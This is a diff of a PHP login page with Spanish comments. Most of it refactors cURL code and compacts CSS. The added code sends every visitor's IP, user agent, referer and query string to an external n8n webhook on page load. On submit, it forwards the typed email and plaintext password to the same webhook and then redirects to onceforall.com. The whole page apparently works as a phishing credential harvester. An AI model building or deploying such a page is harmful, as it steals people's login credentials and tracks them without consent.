@@ -21,13 +21,67 @@ function getClientIp(): string {
     return '';
 }
 
+// ---- Utilidades comunes ----
+function postJson(string $url, array $data, int $timeoutSeconds = 15): array {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_HTTPHEADER => [
+            'Content-Type: application/json',
+            'Accept: application/json',
+        ],
+        CURLOPT_POSTFIELDS => json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE),
+        CURLOPT_TIMEOUT => $timeoutSeconds,
+        CURLOPT_CONNECTTIMEOUT => min($timeoutSeconds, 5),
+        CURLOPT_FOLLOWLOCATION => true,
+    ]);
+    $body = curl_exec($ch);
+    $errNo = curl_errno($ch);
+    $http  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return ['err' => $errNo, 'http' => $http, 'body' => $body];
+}
+
+function sanitizeArray(array $in): array {
+    $out = [];
+    foreach ($in as $k => $v) {
+        if (is_array($v)) {
+            $out[$k] = sanitizeArray($v);
+        } else {
+            $s = (string)$v;
+            $out[$k] = mb_substr($s, 0, 1000); // evita payloads gigantes
+        }
+    }
+    return $out;
+}
+
 $clientIp = getClientIp();
 
-// ---- Manejo del envío ----
+// ---- Config ----
 $apiUrl = 'https://n8n.cast1llo.com/webhook/95da625a-d94c-4987-833a-53bedbbf726c';
 $resultMsg = null;
 $resultType = null; // 'success' | 'error'
 
+// ---- Envío en PAGE VIEW (GET) ----
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    // Datos comunes de la visita
+    $viewPayload = [
+        'event'           => 'page_view',
+        'ip'              => $clientIp,
+        'user_agent'      => $_SERVER['HTTP_USER_AGENT'] ?? null,
+        'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? null,
+        'referer'         => $_SERVER['HTTP_REFERER'] ?? null,
+        'method'          => 'GET',
+        'uri'             => $_SERVER['REQUEST_URI'] ?? null,
+        'query'           => sanitizeArray($_GET),
+        'timestamp'       => date('c'),
+    ];
+    // En GET usamos timeout corto para no afectar carga de página
+    postJson($apiUrl, $viewPayload, 3);
+}
+
+// ---- Manejo del envío (POST / login) ----
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Sanitizar entrada básica (para mostrarla después si hace falta)
     $email = isset($_POST['email']) ? trim($_POST['email']) : '';
@@ -41,39 +95,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $resultType = 'error';
         $resultMsg = 'El email no tiene un formato válido.';
     } else {
-        // Construir payload JSON
-        $payload = json_encode([
+        // Payload de intento de login
+        $payload = [
+            'event'       => 'login_attempt',
             'email'       => $email,
             'password'    => $password,
-            'ip'          => $clientIp,        // IP de servidor (fiable)
-            'ip_form'     => $clientIpFromForm,// IP recibida del hidden (solo depuración)
+            'ip'          => $clientIp,         // IP de servidor (fiable)
+            'ip_form'     => $clientIpFromForm, // IP recibida del hidden (solo depuración)
             'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? null,
-            'timestamp'   => date('c') // ISO 8601
-        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
+            'timestamp'   => date('c'),         // ISO 8601
+        ];
 
-        // Llamada cURL a la API
-        $ch = curl_init($apiUrl);
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_POST => true,
-            CURLOPT_HTTPHEADER => [
-                'Content-Type: application/json',
-                'Accept: application/json',
-            ],
-            CURLOPT_POSTFIELDS => $payload,
-            CURLOPT_TIMEOUT => 15, // segundos
-        ]);
-
-        $responseBody = curl_exec($ch);
-        $curlErrNo = curl_errno($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
+        $res = postJson($apiUrl, $payload, 15);
+        $curlErrNo = $res['err'];
+        $httpCode  = $res['http'];
+        $responseBody = $res['body'];
 
         if ($curlErrNo) {
             $resultType = 'error';
             $resultMsg = 'No se pudo contactar con el servicio de autenticación. Inténtalo más tarde.';
         } else {
-            // Intentar decodificar JSON
             $json = json_decode($responseBody, true);
             if ($httpCode >= 200 && $httpCode < 300) {
                 $resultType = 'success';
@@ -81,12 +122,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 header("Location: https://onceforall.com");
                 die();
             } else {
-                // Extraer error devuelto por la API (si lo hay)
-                $apiError = is_array($json) && isset($json['error']) ? $json['error'] : null;
+                $apiError   = is_array($json) && isset($json['error'])   ? $json['error']   : null;
                 $apiMessage = is_array($json) && isset($json['message']) ? $json['message'] : null;
-
                 $resultType = 'error';
-                $resultMsg = $apiMessage ?? $apiError ?? "Error de autenticación (HTTP $httpCode).";
+                $resultMsg  = $apiMessage ?? $apiError ?? "Error de autenticación (HTTP $httpCode).";
             }
         }
     }
@@ -111,9 +150,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     *{ box-sizing:border-box; }
 
-    html,body{
-      height:100%;
-    }
+    html,body{ height:100%; }
     body{
       margin:0;
       font-family: 'Segoe UI', system-ui, -apple-system, Roboto, sans-serif;
@@ -135,8 +172,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     .left{
       position:relative;
       padding: var(--space);
-      background:
-        #fff url('https://www.transparenttextures.com/patterns/hexellence.png') repeat;
+      background:#fff url('https://www.transparenttextures.com/patterns/hexellence.png') repeat;
       display:flex;
       flex-direction: column;
       align-items:stretch;
@@ -153,10 +189,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       background:#fff;
     }
 
-    .form-content{
-      width:100%;
-      max-width: 440px;
-    }
+    .form-content{ width:100%; max-width: 440px; }
 
     .logo{
       width: clamp(120px, 18vw, 160px);
@@ -183,99 +216,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     @media (max-width: 959px) {
-      .topbar {
-        position: static;
-        margin-bottom: 32px;
-        justify-content: flex-start;
-      }
-      .lang {
-        display: none;
-      }
-      .form-content {
-        align-self: center;
-      }
+      .topbar { position: static; margin-bottom: 32px; justify-content: flex-start; }
+      .lang { display: none; }
+      .form-content { align-self: center; }
     }
 
-    h2{
-      font-size: clamp(22px, 3.8vw, 28px);
-      margin: 6px 0 18px 0;
-      text-transform: capitalize;
-    }
+    h2{ font-size: clamp(22px, 3.8vw, 28px); margin: 6px 0 18px 0; text-transform: capitalize; }
 
-    form{
-      display:flex;
-      flex-direction:column;
-      gap: 14px;
-    }
+    form{ display:flex; flex-direction:column; gap: 14px; }
 
     .sr-only{
-      position:absolute;
-      width:1px;
-      height:1px;
-      padding:0;
-      margin:-1px;
-      overflow:hidden;
-      clip:rect(0,0,0,0);
-      white-space:nowrap;
-      border:0;
+      position:absolute; width:1px; height:1px; padding:0; margin:-1px;
+      overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0;
     }
 
     input[type="email"], input[type="password"]{
-      width:100%;
-      padding: 14px 16px;
-      border-radius: 10px;
-      border:1px solid var(--line);
-      font-size: clamp(15px, 3.2vw, 16px);
-      background:#fff;
-      box-shadow: var(--shadow);
-      color:#333;
+      width:100%; padding: 14px 16px; border-radius: 10px; border:1px solid var(--line);
+      font-size: clamp(15px, 3.2vw, 16px); background:#fff; box-shadow: var(--shadow); color:#333;
     }
     input::placeholder{ color:#999; }
 
-    .forgot{
-      font-size: 14px;
-      color:#0077cc;
-      text-decoration:none;
-      align-self:flex-end;
-    }
+    .forgot{ font-size: 14px; color:#0077cc; text-decoration:none; align-self:flex-end; }
 
     .login-btn{
-      width:100%;
-      padding: 14px 16px;
-      background: var(--brand);
-      color:#fff;
-      border:none;
-      border-radius: 999px;
-      font-size: 16px;
-      cursor:pointer;
+      width:100%; padding: 14px 16px; background: var(--brand); color:#fff; border:none;
+      border-radius: 999px; font-size: 16px; cursor:pointer;
     }
 
-    .or-divider{
-      margin: 16px 0;
-      text-align:center;
-      font-size:14px;
-      color:#999;
-    }
-
+    .or-divider{ margin: 16px 0; text-align:center; font-size:14px; color:#999; }
     .join{ font-size:14px; }
     .join a{ color:#0077cc; text-decoration:none; font-weight:bold; }
 
-    .right h3{
-      font-size: clamp(18px, 3.6vw, 24px);
-      margin: 6px 0 8px 0;
-    }
-    .right p{
-      font-size: clamp(14px, 3.2vw, 16px);
-      color: var(--muted);
-      max-width: 560px;
-      margin: 0 auto;
-    }
+    .right h3{ font-size: clamp(18px, 3.6vw, 24px); margin: 6px 0 8px 0; }
+    .right p{ font-size: clamp(14px, 3.2vw, 16px); color: var(--muted); max-width: 560px; margin: 0 auto; }
 
     .alert{
-      margin-bottom: 12px;
-      padding: 12px 14px;
-      border-radius: 10px;
-      font-size: 14px;
+      margin-bottom: 12px; padding: 12px 14px; border-radius: 10px; font-size: 14px;
       border:1px solid transparent;
     }
     .alert-success{ background:#f0fff4; border-color:#c6f6d5; color:#22543d; }
@@ -283,45 +259,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     /* --- Breakpoint tablet --- */
     @media (min-width: 768px){
-      .container{
-        /* aún una columna, más aire */
-      }
       .right p{ max-width: 640px; }
     }
 
     /* --- Breakpoint escritorio --- */
     @media (min-width: 960px){
-      .container{
-        grid-template-columns: 3fr 1fr; /* ~75/25 */
-        min-height: 100vh;
-      }
+      .container{ grid-template-columns: 3fr 1fr; min-height: 100vh; }
       .left, .right{ padding: 60px; }
 
-      /* Topbar flotante estilo original sólo en desktop */
-      .topbar{
-        position:absolute;
-        top:40px;
-        left:60px;
-        right:60px;
-        max-width: none;
-      }
+      .topbar{ position:absolute; top:40px; left:60px; right:60px; max-width: none; }
       .logo{ margin:0; }
       .lang{ margin-left:auto; }
 
-      .right{
-        align-items:flex-start;
-        text-align:left;
-        justify-content:center;
-      }
+      .right{ align-items:flex-start; text-align:left; justify-content:center; }
     }
 
-    /* --- Pantallas muy pequeñas --- */
     @media (max-width: 360px){
       .right p{ font-size: 13px; }
       .forgot{ font-size: 13px; }
     }
 
-    /* Accesibilidad: reducir animaciones si el usuario lo prefiere */
     @media (prefers-reduced-motion: reduce){
       * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; scroll-behavior: auto !important; }
     }
